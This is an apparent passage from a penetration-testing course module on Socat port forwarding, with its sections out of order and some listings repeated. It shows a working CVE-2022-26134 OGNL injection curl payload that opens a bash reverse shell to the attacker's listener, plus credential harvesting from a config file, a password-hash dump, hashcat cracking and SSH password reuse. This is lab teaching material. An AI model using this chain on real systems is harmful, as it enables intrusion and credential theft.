    inet 10.4.50.63/24 brd 10.4.50.255 scope global ens224
       valid_lft forever preferred_lft forever
    inet6 fe80::250:56ff:fe8a:c2c9/64 scope link 
       valid_lft forever preferred_lft forever
```

> Listing 7 - Enumerating network interfaces on CONFLUENCE01.

The output shows us that CONFLUENCE01 has two network interfaces: _ens192_ and _ens224_. _ens192_ has the IP address 192.168.50.63, and _ens224_ has the IP address 10.4.50.63. We can then check the routes using **ip route**.

```
confluence@confluence01:/opt/atlassian/confluence/bin$ ip route
ip route
default via 192.168.50.254 dev ens192 proto static 
10.4.50.0/24 dev ens224 proto kernel scope link src 10.4.50.63 
10.4.50.0/24 via 10.4.50.254 dev ens224 proto static
192.168.50.0/24 dev ens192 proto kernel scope link src 192.168.50.63
```

> Listing 8 - Enumerating routes on CONFLUENCE01.

The command shows us that we should be able to access hosts in the 192.168.50.0/24 subnet through the _ens192_ interface, and hosts in the 10.4.50.0/24 subnet through the _ens224_ interface.

Continuing our enumeration, we'll find the Confluence configuration file at **/var/atlassian/application-data/confluence/confluence.cfg.xml**. While reading the contents using **cat**, we discover some plaintext database credentials located within.

```
confluence@confluence01:/opt/atlassian/confluence/bin$ cat /var/atlassian/application-data/confluence/confluence.cfg.xml
<sian/application-data/confluence/confluence.cfg.xml   
<?xml version="1.0" encoding="UTF-8"?>

<confluence-configuration>
  <setupStep>complete</setupStep>
  <setupType>custom</setupType>
  <buildNumber>8703</buildNumber>
  <properties>
...
    <property name="hibernate.connection.password">D@t4basePassw0rd!</property>
    <property name="hibernate.connection.url">jdbc:postgresql://10.4.50.215:5432/confluence</property>
    <property name="hibernate.connection.username">postgres</property>
...
  </properties>
</confluence-configuration>
confluence@confluence01:/opt/atlassian/confluence/bin$ 
```

> Listing 9 - The credentials found in the Confluence confluence.cfg.xml file on CONFLUENCE01.

We'll find the IP address of the database server, as well as the plain text username and password used to connect to it. We can use these credentials to authenticate to the database and continue our enumeration.

We've hit a limitation, however. CONFLUENCE01 doesn't have a PostgreSQL client installed on it. Since we are running as the low-privileged _confluence_ user, we are also unable to easily install software.

We _do_ have the PostgreSQL client _psql_ installed on our Kali machine, but we can't connect directly to PGDATABASE01 from our Kali machine, since it's only routable from CONFLUENCE01.

In this scenario, there is no firewall in place between our Kali machine and CONFLUENCE01, meaning that there is nothing stopping us from binding ports on the WAN interface of CONFLUENCE01 and connecting to them from our Kali machine.

This is exactly the type of situation in which port forwarding can be useful. We can create a port forward on CONFLUENCE01 that listens on a port on the WAN interface, then forward all packets received on this port to the PGDATABASE01 on the internal subnet. In the next section, we will use [_Socat_](http://www.dest-unreach.org/socat/doc/socat.html) to achieve this.

## 19.2.3. Port Forwarding with Socat

Now we are ready to create a port forward. We have an idea of how we want it to work: CONFLUENCE01 should listen on a port on the WAN interface and forward all packets received on this port to the PGDATABASE01 on the internal subnet. This concept is illustrated in the following diagram:

![Figure 2: The way we expect our port forward to work](https://static.offsec.com/offsec-courses/PEN-200/imgs/prat2/0821666b2826564e07661eba0550c37a-PRAT2_1_1_PortForwardPlan.png)

Figure 2: The way we expect our port forward to work

We want to open TCP port 2345 on the WAN interface of CONFLUENCE01, then connect to that port from our Kali machine. We want all the packets that we send to this port to be forwarded by CONFLUENCE01 to TCP port 5432 on PGDATABASE01. Once we set up our port forward, connecting to TCP port 2345 on CONFLUENCE01 will be exactly like connecting directly to TCP port 5432 on PGDATABASE01.

As part of our enumeration of CONFLUENCE01, we'll find Socat installed. Socat is a general-purpose networking tool that can set up a simple port forward in a single command.

In this scenario, we find it already installed, but Socat does not tend to be installed by default on \*NIX systems. If not already installed, it's possible to download and run a statically linked binary version instead.

We will use Socat to configure the desired port forward on CONFLUENCE01. It will listen on a port on the WAN interface (that our Kali machine can connect to) and forward packets received on that port to PGDATABASE01.

On CONFLUENCE01, we'll start a verbose (**\-ddd**) Socat process. It will listen on TCP port 2345 (**TCP-LISTEN:2345**), fork into a new subprocess when it receives a connection (**fork**) instead of dying after a single connection, then forward all traffic it receives to TCP port 5432 on PGDATABASE01 (**TCP:10.4.50.215:5432**).

We'll listen on port 2345 since it is outside the privileged port range (0-1024), meaning elevated privileges are not required.

```
confluence@confluence01:/opt/atlassian/confluence/bin$ socat -ddd TCP-LISTEN:2345,fork TCP:10.4.50.215:5432
<ocat -ddd TCP-LISTEN:2345,fork TCP:10.4.50.215:5432   
2022/08/18 10:12:01 socat[46589] I socat by Gerhard Rieger and contributors - see www.dest-unreach.org
2022/08/18 10:12:01 socat[46589] I This product includes software developed by the OpenSSL Project for use in the OpenSSL Toolkit. (http://www.openssl.org/)
2022/08/18 10:12:01 socat[46589] I This product includes software written by Tim Hudson (tjh@cryptsoft.com)
2022/08/18 10:12:01 socat[46589] I setting option "fork" to 1
2022/08/18 10:12:01 socat[46589] I socket(2, 1, 6) -> 5
2022/08/18 10:12:01 socat[46589] I starting accept loop
2022/08/18 10:12:01 socat[46589] N listening on AF=2 0.0.0.0:2345
```

> Listing 10 - Running the Socat port forward command.

The network is now set up like the following diagram:

![Figure 3: Socat in place as our port forwarder](https://static.offsec.com/offsec-courses/PEN-200/imgs/prat2/eb1577c7ae460992abbeee4839ffb4e3-PRAT2_1_3_PortForwardSocat.png)

Figure 3: Socat in place as our port forwarder

With the Socat process running, we can run **psql** on our Kali machine, specifying that we want to connect to CONFLUENCE01 (**\-h 192.168.50.63**) on port 2345 (**\-p 2345**) with the _postgres_ user account (**\-U postgres**). When prompted, we will enter the password, and once connected, we can run the **\\l** command to list the available databases.

```
kali@kali:~$ psql -h 192.168.50.63 -p 2345 -U postgres
Password for user postgres: 
psql (14.2 (Debian 14.2-1+b3), server 12.11 (Ubuntu 12.11-0ubuntu0.20.04.1))
SSL connection (protocol: TLSv1.3, cipher: TLS_AES_256_GCM_SHA384, bits: 256, compression: off)
Type "help" for help.

postgres=# \l
                                  List of databases
    Name    |  Owner   | Encoding |   Collate   |    Ctype    |   Access privileges   
------------+----------+----------+-------------+-------------+-----------------------
 confluence | postgres | UTF8     | en_US.UTF-8 | en_US.UTF-8 | 
 postgres   | postgres | UTF8     | en_US.UTF-8 | en_US.UTF-8 | 
 template0  | postgres | UTF8     | en_US.UTF-8 | en_US.UTF-8 | =c/postgres          +
            |          |          |             |             | postgres=CTc/postgres
 template1  | postgres | UTF8     | en_US.UTF-8 | en_US.UTF-8 | =c/postgres          +
            |          |          |             |             | postgres=CTc/postgres
(4 rows)
```

> Listing 11 - Connecting to the PGDATABASE01 PostgreSQL service and listing databases using psql, through our port forward.

Success! We've connected to the PostgreSQL database through our port forward. We'll also find that we have access to the _confluence_ database.

Using our new database access, we can continue our enumeration. In the confluence database, let's query the _cwd\_user_ table. This contains the username and password hashes for all Confluence users. We'll connect to the database with the **\\c confluence** command, then run **select \* from cwd\_user;** to review everything in that table.

```
postgres=# \c confluence
psql (14.2 (Debian 14.2-1+b3), server 12.11 (Ubuntu 12.11-0ubuntu0.20.04.1))
SSL connection (protocol: TLSv1.3, cipher: TLS_AES_256_GCM_SHA384, bits: 256, compression: off)
You are now connected to database "confluence" as user "postgres".

confluence=# select * from cwd_user;

   id    |   user_name    | lower_user_name | active |      created_date       |      updated_date       | first_name | lower_first_name |   last_name   | lower_last_name |      display_name      |   lower_display_name   |           email_address            |        lower_email_address         |             external_id              | directory_id |                                credential                                 
---------+----------------+-----------------+--------+-------------------------+-------------------------+------------+------------------+---------------+-----------------+------------------------+------------------------+------------------------------------+------------------------------------+--------------------------------------+--------------+---------------------------------------------------------------------------
  458753 | admin          | admin           | T      | 2022-08-17 15:51:40.803 | 2022-08-17 15:51:40.803 | Alice      | alice            | Admin         | admin           | Alice Admin            | alice admin            | alice@industries.internal          | alice@industries.internal          | c2ec8ebf-46d9-4f5f-aae6-5af7efadb71c |       327681 | {PKCS5S2}WbziI52BKm4DGqhD1/mCYXPl06IAwV7MG7UdZrzUqDG8ZSu15/wyt3XcVSOBo6bC
 1212418 | trouble        | trouble         | T      | 2022-08-18 10:31:48.422 | 2022-08-18 10:31:48.422 |            |                  | Trouble       | trouble         | Trouble                | trouble                | trouble@industries.internal        | trouble@industries.internal        | 164eb9b5-b6ef-4c0f-be76-95d19987d36f |       327681 | {PKCS5S2}A+U22DLqNsq28a34BzbiNxzEvqJ+vBFdiouyQg/KXkjK0Yd9jdfFavbhcfZG1rHE
 1212419 | happiness      | happiness       | T      | 2022-08-18 10:33:49.058 | 2022-08-18 10:33:49.058 |            |                  | Happiness     | happiness       | Happiness              | happiness              | happiness@industries.internal      | happiness@industries.internal      | b842163d-6ff5-4858-bf54-92a8f5b28251 |       327681 | {PKCS5S2}R7/ABMLgNl/FZr7vvUlCPfeCup9dpg5rplddR6NJq8cZ8Nqq+YAQaHEauk/HTP49
 1212417 | database_admin | database_admin  | T      | 2022-08-18 10:24:34.429 | 2022-08-18 10:24:34.429 | Database   | database         | Admin Account | admin account   | Database Admin Account | database admin account | database_admin@industries.internal | database_admin@industries.internal | 34901af8-b2af-4c98-ad1d-f1e7ed1e52de |       327681 | {PKCS5S2}QkXnkmaBicpsp0B58Ib9W5NDFL+1UXgOmJIvwKjg5gFjXMvfeJ3qkWksU3XazzK0
 1212420 | hr_admin       | hr_admin        | T      | 2022-08-18 18:39:04.59  | 2022-08-18 18:39:04.59  | HR         | hr               | Admin         | admin           | HR Admin               | hr admin               | hr_admin@industries.internal       | hr_admin@industries.internal       | 2f3cc06a-7b08-467e-9891-aaaaeffe56ea |       327681 | {PKCS5S2}EiMTuK5u8IC9qGGBt5cVJKLu0uMz7jN21nQzqHGzEoLl6PBbUOut4UnzZWnqCamV
 1441793 | rdp_admin      | rdp_admin       | T      | 2022-08-20 20:46:03.325 | 2022-08-20 20:46:03.325 | RDP        | rdp              | Admin         | admin           | RDP Admin              | rdp admin              | rdp_admin@industries.internal      | rdp_admin@industries.internal      | e9a9e0f5-42a2-433a-91c1-73c5f4cc42e3 |       327681 | {PKCS5S2}skupO/gzzNBHhLkzH3cejQRQSP9vY4PJNT6DrjBYBs23VRAq4F5N85OAAdCv8S34
(6 rows)

(END)
```

> Listing 12 - The contents of the cwd\_user table in the confluence database.

We obtain multiple rows of user data. Each row contains data for a single Confluence user, including their password hash. We will use [_Hashcat_](https://hashcat.net/hashcat/) to try to crack these.

The [Hashcat mode number](https://hashcat.net/wiki/doku.php?id=example_hashes) for _Atlassian (PBKDF2-HMAC-SHA1)_ hashes is _12001_, so we can pass that to the **\-m** mode flag. After copying the hashes into a file called **hashes.txt**, we'll pass this as the first positional argument. We can then pass the **fastrack.txt** password list that's built into Kali as the final positional argument.

```
kali@kali:~$ hashcat -m 12001 hashes.txt /usr/share/wordlists/fasttrack.txt 
hashcat (v6.2.5) starting

OpenCL API (OpenCL 2.0 pocl 1.8  Linux, None+Asserts, RELOC, LLVM 11.1.0, SLEEF, DISTRO, POCL_DEBUG) - Platform #1 [The pocl project]
=====================================================================================================================================
* Device #1: pthread-11th Gen Intel(R) Core(TM) i7-11800H @ 2.30GHz, 2917/5899 MB (1024 MB allocatable), 4MCU

Minimum password length supported by kernel: 0
Maximum password length supported by kernel: 256

...

{PKCS5S2}skupO/gzzNBHhLkzH3cejQRQSP9vY4PJNT6DrjBYBs23VRAq4F5N85OAAdCv8S34:P@ssw0rd!
{PKCS5S2}QkXnkmaBicpsp0B58Ib9W5NDFL+1UXgOmJIvwKjg5gFjXMvfeJ3qkWksU3XazzK0:sqlpass123
{PKCS5S2}EiMTuK5u8IC9qGGBt5cVJKLu0uMz7jN21nQzqHGzEoLl6PBbUOut4UnzZWnqCamV:Welcome1234
...
```

> Listing 13 - Hashcat having cracked the database\_admin, hr\_admin and rdp\_admin account hashes.

It appears that the password policy for this Confluence instance isn't very strong. After only a few minutes of cracking, Hashcat returns passwords for the _database\_admin_, _hr\_admin_ and _rdp\_admin_ users.

We might suspect that these passwords are reused in other places throughout the network. After some more enumeration of the internal network, we'll find PGDATABASE01 is also running an SSH server. Let's try these credentials against this SSH server. With our new port forwarding skill, we can create a port forward on CONFLUENCE01 that will allow us to SSH directly from our Kali machine to PGDATABASE01.

First, we need to kill the original Socat process listening on TCP port 2345. We'll then create a new port forward with Socat that will listen on TCP port 2222 and forward to TCP port 22 on PGDATABASE01.

```
confluence@confluence01:/opt/atlassian/confluence/bin$ socat TCP-LISTEN:2222,fork TCP:10.4.50.215:22
</bin$ socat TCP-LISTEN:2222,fork TCP:10.4.50.215:22 

```

> Listing 14 - Creating a new port forward with Socat to access the SSH service on PGDATABASE01.

With our new Socat port forward set up, our network setup will be configured much like the following diagram:

![Figure 4: Using Socat to open a port forward from CONFLUENCE01 to the SSH server on PGDATABASE01](https://static.offsec.com/offsec-courses/PEN-200/imgs/prat2/ae6bb27852f848e8c26cbb2eb12443fb-PRAT2_1_4_PortForwardSocatSSH.png)

Figure 4: Using Socat to open a port forward from CONFLUENCE01 to the SSH server on PGDATABASE01

There are only very minimal differences between this and the previous network setup. Instead of listening on 2345, we are listening on 2222. Instead of forwarding to TCP port 5432 on PGDATABASE01, we are forwarding to TCP port 22 on PGDATABASE01.

We'll then use our SSH client to connect to port 2222 on CONFLUENCE01, as though we are connecting directly to port 22 on PGDATABASE01. We can use the _database\_admin_ user, and the password we just cracked using Hashcat.

```
kali@kali:~$ ssh database_admin@192.168.50.63 -p2222
The authenticity of host '[192.168.50.63]:2222 ([192.168.50.63]:2222)' can't be established.
ED25519 key fingerprint is SHA256:3TRC1ZwtlQexLTS04hV3ZMbFn30lYFuQVQHjUqlYzJo.
This key is not known by any other names
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '[192.168.50.63]:2222' (ED25519) to the list of known hosts.
database_admin@192.168.50.63's password: 
Welcome to Ubuntu 20.04.4 LTS (GNU/Linux 5.4.0-122-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Thu 18 Aug 2022 11:43:07 AM UTC

  System load:  0.1               Processes:               241
  Usage of /:   59.3% of 7.77GB   Users logged in:         1
  Memory usage: 16%               IPv4 address for ens192: 10.4.50.215
  Swap usage:   0%                IPv4 address for ens224: 172.16.50.215


0 updates can be applied immediately.

Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings

The programs included with the Ubuntu system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
applicable law.

database_admin@pgdatabase01:~$
```

> Listing 15 - Connecting to SSH server on PGDATABASE01, through the port forward on CONFLUENCE01.

Success! The **database\_admin** credentials have been reused here. We have managed to connect to the SSH server on PGDATABASE01 using the credentials for _database\_admin_ we found in the PostgreSQL database through the port forward we set up on CONFLUENCE01 with Socat.

In this Learning Unit, we created some simple port forwards using Socat. These allowed us to gain deeper access within a network by leveraging our existing access to a compromised host.

It should also be noted that Socat is not the only way to create port forwards on \*NIX hosts. There are several alternatives, of note:

-   [_rinetd_](https://github.com/samhocevar/rinetd) is an option that runs as a daemon. This makes it a better solution for longer-term port forwarding configurations but is slightly unwieldy for temporary port forwarding solutions.
    
-   We can combine Netcat and a [_FIFO_](https://man7.org/linux/man-pages/man7/fifo.7.html) named pipe file to create a [port forward](https://gist.github.com/holly/6d52dd9addd3e58b2fd5).
    
-   If we have root privileges, we could use iptables to create port forwards. The specific iptables port forwarding setup for a given host will likely depend on the configuration already in place. To be able to forward packets in Linux also requires enabling forwarding on the interface we want to forward on by writing "1" to **/proc/sys/net/ipv4/conf/\[interface\]/forwarding** (if it's not already configured to allow it).
    

## Resources

Some of the labs require you to start the target machine(s) below.

Please note that the IP addresses assigned to your target machines may not match those referenced in the Module text and video.

Port Redirection and SSH Tunneling - Port Forwarding with Socat - VM Group

#### Labs

1.  Follow the steps in this section to set up a port forward and gain access to the _confluence_ database on PGDATABASE01 using **psql** from your Kali machine. Crack the password of the _database\_admin_ user. What is the plain text password of this account?

Answer

# 19\. Port Redirection and SSH Tunneling

In this Learning Module, we will cover the following Learning Units:

-   Port Forwarding on \*NIX and Windows Machines
-   SSH Tunneling on (and between) \*NIX and Windows Machines

## 19.1. Why Port Redirection and Tunneling?

This Learning Unit covers the following Learning Objectives:

-   Understand the difference between common network layouts
-   Consider the impact of common network security devices
-   Understand when to use port redirection and tunneling techniques

Most network environments are not -and should not be- [_flat_](https://en.wikipedia.org/wiki/Flat_network), In a flat network, all devices are able to communicate freely with each other. There is little (or no) attempt to limit the access that each device has to other devices on the same network, regardless of whether devices need to communicate during normal operations.

Flat network topology is generally considered poor security practice. Once an attacker has access to a single host, they can start communicating with every other host. From there, it will be much easier to spread through the network and start compromising other hosts.

A more securely designed network type is [_segmented_](https://en.wikipedia.org/wiki/Network_segmentation).This type of network will be broken into smaller networks, each of which is called a [_subnet_](https://en.wikipedia.org/wiki/Subnetwork). Each subnet will contain a group of devices that have a specific purpose, and devices on that subnet are only granted access to other subnets and hosts when absolutely necessary. Network segmentation severely limits attackers, because compromising a single host no longer gives them free access to every other device on the network.

As part of the network segmentation process, most network administrators will also implement controls that limit the flow of traffic into, out from, and across their networks. To enforce this, they will deploy various technologies throughout the network.

One of the most common technologies used for this is [_Firewalls_](https://en.wikipedia.org/wiki/Firewall_(computing)). Firewalls can be implemented at the endpoint software level. For example, the _Linux kernel_ has firewall capabilities that can be configured with the [_iptables_](https://en.wikipedia.org/wiki/Iptables) tool suite, while Windows offers the built-in [_Windows Defender Firewall_](https://learn.microsoft.com/en-us/windows/security/threat-protection/windows-firewall/windows-firewall-with-advanced-security). Firewalls may also be implemented as features within a piece of physical network infrastructure. Administrators may even place a standalone _hardware firewall_ in the network, filtering all traffic.

Firewalls can drop unwanted inbound packets and prevent potentially malicious traffic from traversing or leaving the network. Firewalls may prevent all but a few allowed hosts from communicating with a port on a particularly privileged server. They can also block some hosts or subnets from accessing the wider _internet_.

Most firewalls tend to allow or block traffic in line with a set of rules based on _IP addresses_ and _port numbers_, so their functionality is limited. However, sometimes more fine-grained control is required. [_Deep Packet Inspection_](https://en.wikipedia.org/wiki/Deep_packet_inspection) monitors the contents of incoming and outgoing traffic and terminates it based on a set of rules.

Boundaries that are put in place by network administrators are designed to prevent the _arbitrary movement of data into, out of, and across the network_. But, as an attacker, these are exactly the boundaries we need to traverse. We'll need to develop strategies that can help us work around network restrictions as we find them.

_Port redirection_ (a term we are using to describe various types of [_port forwarding_](https://en.wikipedia.org/wiki/Port_forwarding)) and [_tunneling_](https://en.wikipedia.org/wiki/Tunneling_protocol) are both strategies we can use to traverse these boundaries. Port redirection modifies the data flow by redirecting packets from one socket to another. Tunneling means [_encapsulating_](https://en.wikipedia.org/wiki/Encapsulation_(networking)) one type of data stream within another, for example, transporting _Hypertext Transfer Protocol_ (HTTP) traffic within a _Secure Shell_ (SSH) connection (so from an external perspective, only the SSH traffic will be visible).

In this Module, we will introduce port redirection and tunneling techniques through practical examples. We'll ease in by starting with the lowest complexity techniques, and increase complexity as we move step-by-step towards more hardened network environments. Each new technique will be applied to a new network configuration that is slightly different than the previous. The only tunneling we cover in this Module is SSH tunneling, but we will cover more advanced methods in a later Module.

The [_logical topologies_](https://en.wikipedia.org/wiki/Network_topology) we create when chaining these strategies may initially be difficult to grasp. We will be making traffic move in ways that may not be initially intuitive. We should take the time to fully understand each technique before advancing to the next. By the end of this Module, we'll have all the tools required to manipulate the flow of traffic in any given network with surgical precision.

## 19.2. Port Forwarding with Linux Tools

This Learning Unit covers the following Learning Objectives:

1.  Understand what port forwarding is
2.  Learn when to use port forwarding techniques
3.  Use Socat to set up a port forward in Linux

Port forwarding is the most fundamental technique we will examine in this Module. It's also a technique that's very commonly used in general-purpose networking. When port forwarding, we configure a host to listen on one port and relay all packets received on that port to another destination.

In normal network conditions, a network administrator might create a port forward to allow access to a web server behind a firewall. In that case, they would configure the firewall to listen on a given port on one interface and pass all packets to the web server behind it.

Many home _routers_ also provide port forwarding functionality. These can be configured to listen on a port on the Internet-facing side of the router, then forward connections from that port to another device within the home network.

How might we use port forwarding in an attack chain? In the next section, we'll consider a simple scenario.

## 19.2.1. A Simple Port Forwarding Scenario

Let's examine a port forwarding scenario. During an assessment, we find a Linux web server running a version of [_Confluence_](https://www.atlassian.com/software/confluence) vulnerable to [_CVE-2022-26134_](https://confluence.atlassian.com/doc/confluence-security-advisory-2022-06-02-1130377146.html): a pre-authentication remote code execution issue. We can exploit this vulnerability and gain a reverse shell from the server.

During our enumeration, we find that this server has two _network interfaces_: one attached to the same network our Kali machine is also on (which allowed us to route to it directly), and another on an internal subnet. In the Confluence configuration file, we also find credentials and the IP address and port for a [_PostgreSQL_](https://www.postgresql.org/) database instance on a server in that internal subnet. We want to use these credentials to gain access to the database and enumerate further.

The following diagram illustrates our current understanding of the network layout.

![Figure 1: The network layout from our perspective so far](https://static.offsec.com/offsec-courses/PEN-200/imgs/prat2/9f1e3efdc5c0256e854e387e50f5a621-PRAT2_1_0_ConfluenceAndDatabaseNetworkSetup.png)

Figure 1: The network layout from our perspective so far

One of the first things to notice about this diagram is that there are two named networks: the [_Wide Area Network_](https://en.wikipedia.org/wiki/Wide_area_network) (WAN) on the left and the [_Demilitarized Zone_](https://en.wikipedia.org/wiki/DMZ_(computing)) (DMZ) on the right. Our Kali machine is in the WAN, the PostgreSQL database server PGDATABASE01 is in the DMZ, and the Confluence server CONFLUENCE01 straddles both.

A WAN is a network that is large and expansive. Some people refer to the public internet as the largest WAN in the world, and some larger organizations will refer to their large internal network as a WAN, or internal WAN. In this case, since we're simulating an attack from an external network, the WAN represents a large corporate internal network, or the internet itself.

In this module’s exercises, our Kali machine will be positioned in the WAN We can route directly from our Kali machine only to hosts also on the WAN.

A DMZ is a network containing devices that may be more exposed to a wider, less trusted network. A DMZ helps create a buffer zone between hosts on the wider, less trusted network and internal hosts. In this way, it serves a similar function to a real-world [_Demilitarized zone_](https://en.wikipedia.org/wiki/Demilitarized_zone). In this scenario, the DMZ is the buffer network segment between the WAN and whatever other internal networks we may find.

CONFLUENCE01 is straddling both the WAN and DMZ to illustrate that it can communicate on both networks. CONFLUENCE01 is also listening on TCP port 8090, illustrated by the "open socket" attached to the icon.

PGDATABASE01 is within the DMZ network boundary; it does not straddle the WAN/DMZ. Our Kali machine is not in the DMZ, so we can't directly route to PGDATABASE01. PGDATABASE01 also has an "open socket" attached to it, illustrating that there's something listening on TCP port 5432 (this is likely a PostgreSQL server, since the default port is 5432).

Since the only thing we know about PGDATABASE01 so far is that it exists, we don't yet know if it's attached to any other networks. If later we find that PGDATABASE01 is attached to other networks, we will expand our network diagram.

With the credentials we found on CONFLUENCE01, we want to try to connect to this PostgreSQL port on PGDATABASE01 from our Kali machine.

Before getting into more detail, let's set up our lab environment to recreate the scenario we've described so far.

At the end of the _Port Forwarding with Socat_ section of this Learning Unit, a group of VMs are provided that can be used to follow along with the following sections. These VMs are provided so you can gain hands-on experience with all the techniques we cover. You can start the VM group at any point and follow along at whatever pace feels comfortable.

## 19.2.2. Setting Up the Lab Environment

To gain access to CONFLUENCE01, we need to leverage the command execution vulnerability in the Confluence web application to get a reverse shell. After discovering that the Confluence web application is vulnerable to CVE-2022-26134, we'll find a blog post from [_Rapid7_](https://www.rapid7.com/blog/post/2022/06/02/active-exploitation-of-confluence-cve-2022-26134/) that includes a [_cURL_](https://curl.se/) command containing a [_proof-of-concept_](https://en.wikipedia.org/wiki/Proof_of_concept) payload that claims to exploit the vulnerability and return a reverse shell.

```
curl -v http://10.0.0.28:8090/%24%7Bnew%20javax.script.ScriptEngineManager%28%29.getEngineByName%28%22nashorn%22%29.eval%28%22new%20java.lang.ProcessBuilder%28%29.command%28%27bash%27%2C%27-c%27%2C%27bash%20-i%20%3E%26%20/dev/tcp/10.0.0.28/1270%200%3E%261%27%29.start%28%29%22%29%7D/
```

> Listing 1 - The example payload from the Rapid7 blog post.

We don't run payloads without understanding exactly what they do, so we first need to figure out what's happening in this proof-of-concept.

The verbose (**\-v**) **curl** request is being made to **http://10.0.0.28:8090**, which we assume is the blogpost author's vulnerable Confluence server. After this, the URL [_path_](https://en.wikipedia.org/wiki/Uniform_Resource_Identifier#Syntax) looks more interesting. We observe that a lot of the characters in it are [_URL encoded_](https://en.wikipedia.org/wiki/Percent-encoding), so we need to _URL decode_ them to get a clearer sense of what the payload actually does.

You can quickly URL decode strings by selecting _Decode As..._ > _URL_ in the _Decoder_ tab in [_Burp_](https://portswigger.net/burp), or using an online tool such as [_CyberChef_](https://gchq.github.io/CyberChef/) If working with sensitive information in a real corporate environment, you should avoid pasting data into online tools. However, in this case we're decoding a proof-of-concept that's already public, so we can use online tools if necessary.

After URL decoding the path, the function of the payload is clearer.

```
/${new javax.script.ScriptEngineManager().getEngineByName("nashorn").eval("new java.lang.ProcessBuilder().command('bash','-c','bash -i >& /dev/tcp/10.0.0.28/1270 0>&1').start()")}/
```

> Listing 2 - The example payload URL-decoded.

The URL path is an _OGNL injection_ payload. OGNL is [_Object-Graph Notation Language_](https://en.wikipedia.org/wiki/OGNL), an expression language commonly used in Java applications. OGNL injection can take place when an application handles user input in such a way that it gets passed to the OGNL expression parser. Since it's possible to execute Java code within OGNL expressions, OGNL injection can be used to execute arbitrary code.

The OGNL injection payload itself uses Java's [_ProcessBuilder_](https://docs.oracle.com/javase/7/docs/api/java/lang/ProcessBuilder.html) class to spawn a _Bash_ interactive reverse shell (_bash -i_).

This proof-of-concept payload is almost perfect for our needs. However, we need to modify it before we can use it. This is for two reasons. First, the Confluence server that the payload is pointing to in the original payload is not where our vulnerable Confluence server is. Second, the Bash reverse shell payload is pointing at port 1270 on 10.0.0.28, which is not where our Kali machine is. We need to modify these parameters in the payload before we can reuse it to exploit CONFLUENCE01 and return a shell to our own Kali machine.

While making these modifications, we also need to take the URL encoding into account. The payload string in the proof-of-concept isn't completely URL encoded. Certain characters (notably ".", "-" and "/") are not encoded. Although it's not always the case, for _this_ exploit, this turns out to be important to the functioning of the payload. If any of these characters are encoded, the server will parse the URL differently, and the payload may not execute. This means we can't apply URL encoding across the whole payload once we've modified it.

Keeping this in mind, we'll manually modify the parameters we need, using the original proof-of-concept payload as our base. We can change the Confluence server IP to **192.168.50.63**, and the Bash interactive shell payload IP and port to a listener we're going to open on our Kali machine (**/dev/tcp/192.168.118.4/4444**). We'll also remove the **curl** verbosity flag. This leaves us with the following modified payload:

```
curl http://192.168.50.63:8090/%24%7Bnew%20javax.script.ScriptEngineManager%28%29.getEngineByName%28%22nashorn%22%29.eval%28%22new%20java.lang.ProcessBuilder%28%29.command%28%27bash%27%2C%27-c%27%2C%27bash%20-i%20%3E%26%20/dev/tcp/192.168.118.4/4444%200%3E%261%27%29.start%28%29%22%29%7D/
```

> Listing 3 - The modified payload.

Now that our payload is customized for our use, we can start a [_Netcat_](https://en.wikipedia.org/wiki/Netcat) listener on our Kali machine on TCP port 4444.

```
kali@kali:~$ nc -nvlp 4444
listening on [any] 4444 ...
```

> Listing 4 - Starting Netcat listener on port 4444 on our Kali machine.

With our listener running, we'll open another shell on our Kali machine, then run the **curl** command we just constructed.

```
kali@kali:~$ curl http://192.168.50.63:8090/%24%7Bnew%20javax.script.ScriptEngineManager%28%29.getEngineByName%28%22nashorn%22%29.eval%28%22new%20java.lang.ProcessBuilder%28%29.command%28%27bash%27%2C%27-c%27%2C%27bash%20-i%20%3E%26%20/dev/tcp/192.168.118.4/4444%200%3E%261%27%29.start%28%29%22%29%7D/

kali@kali:~$ 
```

> Listing 5 - Executing the modified reverse shell payload.

The command itself doesn't return anything, but the reverse shell is caught by our listener.

```
...
listening on [any] 4444 ...
connect to [192.168.118.4] from (UNKNOWN) [192.168.50.63] 55876
bash: cannot set terminal process group (813): Inappropriate ioctl for device
bash: no job control in this shell
confluence@confluence01:/opt/atlassian/confluence/bin$ id
id
uid=1001(confluence) gid=1001(confluence) groups=1001(confluence)
```

> Listing 6 - Bash reverse shell caught by our Netcat listener, and confirmed with the id command.

The **id** command confirms that this shell is running with the privileges of the _confluence_ user. This user has quite limited privileges. Regardless, we now have a reverse shell from CONFLUENCE01 to our Kali machine.

We can now start some light enumeration of CONFLUENCE01 using our new shell. We'll check the network interfaces using **ip addr**.

```
confluence@confluence01:/opt/atlassian/confluence/bin$ ip addr
ip addr
1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000
    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
    inet 127.0.0.1/8 scope host lo
       valid_lft forever preferred_lft forever
    inet6 ::1/128 scope host 
       valid_lft forever preferred_lft forever
2: ens192: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc fq_codel state UP group default qlen 1000
    link/ether 00:50:56:8a:54:46 brd ff:ff:ff:ff:ff:ff
    inet 192.168.50.63/24 brd 192.168.50.255 scope global ens192
       valid_lft forever preferred_lft forever
    inet6 fe80::250:56ff:fe8a:5446/64 scope link 
       valid_lft forever preferred_lft forever
3: ens224: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc fq_codel state UP group default qlen 1000
    link/ether 00:50:56:8a:c2:c9 brd ff:ff:ff:ff:ff:ff
    inet 10.4.50.63/24 brd 10.4.50.255 scope global ens224
       valid_lft forever preferred_lft forever
    inet6 fe80::250:56ff:fe8a:c2c9/64 scope link 
       valid_lft forever preferred_lft forever
```

> Listing 7 - Enumerating network interfaces on CONFLUENCE01.

The output shows us that CONFLUENCE01 has two network interfaces: _ens192_ and _ens224_. _ens192_ has the IP address 192.168.50.63, and _ens224_ has the IP address 10.4.50.63. We can then check the routes using **ip route**.

```
confluence@confluence01:/opt/atlassian/confluence/bin$ ip route
ip route
default via 192.168.50.254 dev ens192 proto static 
